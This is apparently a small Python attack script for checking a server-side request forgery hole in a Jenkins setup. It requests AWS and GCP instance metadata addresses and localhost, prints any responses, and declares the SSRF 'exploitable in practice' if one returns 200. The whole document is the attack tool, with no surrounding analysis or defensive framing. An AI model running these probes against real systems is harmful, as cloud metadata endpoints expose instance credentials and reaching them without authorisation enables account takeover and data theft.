import requests, json

print("🦅 SSRF VERIFICATION FROM CODESPACE\n")

targets = [
    ("AWS Metadata", "http://169.254.169.254/latest/meta-data/"),
    ("GCP Metadata", "http://metadata.google.internal/"),
    ("HTTPBin (test)", "http://httpbin.org/get"),
    ("Localhost", "http://127.0.0.1:8080/"),
]

for name, url in targets:
    try:
        r = requests.get(url, timeout=5)
        if r.status_code == 200:
            print(f"🔥 SSRF WORKS: {name} → {url}")
            print(f"   Status: {r.status_code}, Size: {len(r.text)} bytes")
            print(f"   Response: {r.text[:150]}...")
        else:
            print(f"⚠️ {name}: HTTP {r.status_code}")
    except Exception as e:
        print(f"❌ {name}: {str(e)[:60]}")

print("\n✅ If any return HTTP 200, the Jenkins SSRF is exploitable in practice.")
